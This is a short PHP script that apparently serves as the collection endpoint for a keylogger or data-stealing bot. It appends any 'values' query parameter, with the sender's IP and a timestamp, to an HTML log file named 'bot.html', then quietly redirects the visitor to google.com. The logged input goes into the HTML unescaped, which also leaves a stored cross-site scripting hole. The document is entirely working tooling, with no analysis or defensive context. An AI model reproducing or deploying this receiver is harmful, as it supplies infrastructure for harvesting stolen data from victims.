<?php

	if($_GET){
		$ip = $_SERVER['REMOTE_ADDR'] ;
		$date = new DateTime("now", new DateTimeZone('Africa/Dakar') ); //SET YOUR DATETIMEZONE
		$d =  $date->format('d/m/Y H:i:s');
		$log = $_GET['values'];
		$txt = '<tr> <th scope="row">'.$ip.'<br> '.$d.' </th> <td width="100%" class="box3D"> '.$log.' </td> </tr>';
		$myfile = fopen("bot.html", "a+") or die("Unable to open file!");
		fwrite($myfile, $txt);
		fclose($myfile);
		echo '<meta http-equiv="refresh" content=1;url="https://google.com">';
	}else{
		echo '<meta http-equiv="refresh" content=1;url="https://google.com">';
	}

?>
